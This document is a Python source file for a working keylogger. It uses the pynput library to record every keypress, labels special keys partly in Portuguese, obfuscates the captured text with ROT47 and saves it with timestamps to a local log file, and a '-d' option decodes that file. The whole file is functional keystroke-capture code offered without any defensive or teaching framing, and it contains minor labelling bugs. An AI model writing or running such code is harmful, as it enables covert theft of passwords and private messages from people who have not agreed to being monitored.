import sys
from datetime import datetime
from pynput.keyboard import Key, Listener

buffer = []

def file_write(txt):
	with open("log.txt", "a") as fp:
		fp.write(txt)

def encode_rot47_char(c, key="!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"):
	try:
		pos = key.index(c)
		npos = (pos + 47) % (len(key))
		return key[npos]
	except ValueError:
		return c

def decode_rot47_char(c):
	drot47 = "PQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNO"
	return encode_rot47_char(c, key=drot47)

def buffer_flush():
	global buffer
	txt = "".join(buffer)
	fmt = datetime.now().strftime("%H:%M:%S")
	file_write("%s> %s\n" % (fmt, txt))
	buffer = []
	print("Flush: %s" % txt)

def buffer_write_char(c):
	if isinstance(c, str) and len(c) == 0: return
	if isinstance(c, str) and len(c) > 1: c = c[0]
	if len(buffer) >= 127: buffer_flush()
	buffer.append(encode_rot47_char(c))
	print("C: %s" % c)

def buffer_write_text(line):
	for c in line: buffer_write_char(c)

def _key_press(key):
	try:
		buffer_write_char(key.char)
	except AttributeError:
		if key == Key.ctrl_l: buffer_write_text("[CTRL ESQ.] ")
		elif key == Key.ctrl_r: buffer_write_text("[CTRL DIR.] ")
		elif key == Key.shift_l: buffer_write_text("[SHIFT ESQ.] ")
		elif key == Key.shift_r: buffer_write_text("[SHIFT DIR.] ")
		elif key == Key.alt_l: buffer_write_text("[ALT ESQ.] ")
		elif key == Key.alt_r: buffer_write_text("[ALT DIR.] ")
		elif key == Key.alt_gr: buffer_write_text("[ALT GR] ")
		elif key == Key.backspace: buffer_write_text("[BACKSPACE] ")
		elif key == Key.delete: buffer_write_text("[DELETE] ")
		elif key == Key.esc: buffer_write_text("[ESC] ")
		elif key == Key.num_lock: buffer_write_text("[NUM LOCK] ")
		elif key == Key.caps_lock: buffer_write_text("[CAPS LOCK] ")
		elif key == Key.page_up: buffer_write_text("[PG. UP] ")
		elif key == Key.page_down: buffer_write_text("[PG. DOWN] ")
		elif key == Key.tab: buffer_write_text("[TAB] ")
		elif key == Key.pause: buffer_write_text("[PAUSE] ")
		elif key == Key.scroll_lock: buffer_write_text("[SCR. LOCK] ")
		elif key == Key.num_lock: buffer_write_text("[NUM LOCK] ")
		elif key == Key.print_screen: buffer_write_text("[PRINT SCR.] ")
		elif key == Key.up: buffer_write_text("[CIMA] ")
		elif key == Key.down: buffer_write_text("[BAIXO] ")
		elif key == Key.left: buffer_write_text("[ESQ.] ")
		elif key == Key.right: buffer_write_text("[DIR.] ")
		elif key == Key.insert: buffer_write_text("[INSERT] ")
		elif key == Key.home: buffer_write_text("[HOME] ")
		elif key == Key.end: buffer_write_text("[END] ")
		elif key == Key.cmd_l: buffer_write_text("[CMD ESQ.] ")
		elif key == Key.cmd_r: buffer_write_text("[CMD DIR.] ")
		elif key == Key.f1: buffer_write_text("[F1] ")
		elif key == Key.f2: buffer_write_text("[F3] ")
		elif key == Key.f3: buffer_write_text("[F4] ")
		elif key == Key.f4: buffer_write_text("[F4] ")
		elif key == Key.f5: buffer_write_text("[F5] ")
		elif key == Key.f6: buffer_write_text("[F6] ")
		elif key == Key.f7: buffer_write_text("[F7] ")
		elif key == Key.f8: buffer_write_text("[F8] ")
		elif key == Key.f9: buffer_write_text("[F9] ")
		elif key == Key.f10: buffer_write_text("[F10] ")
		elif key == Key.f11: buffer_write_text("[F11] ")
		elif key == Key.f12: buffer_write_text("[F12] ")
		elif key == Key.space: buffer_write_char(" ")
		elif key == Key.enter:
			buffer_write_text("[ENTER] ")
			buffer_flush()

if len(sys.argv) >= 2 and sys.argv[1] == "-d":
	lines = []
	with open("log.txt", "r") as fp:
		lines = fp.readlines()
	with open("log.d.txt", "w") as fp:
		for line in lines:
			dline = ""
			for c in line.strip("\n "):
				dline += decode_rot47_char(c)
			fp.write(dline + "\n")
else:
	fmt = datetime.now().strftime("%d/%m/%Y")
	sz = len(fmt) + 3
	div = "=" * (127 - sz)
	file_write("[%s] %s\n" % (fmt, div))

	with Listener(on_press=_key_press) as ls:
		ls.join()
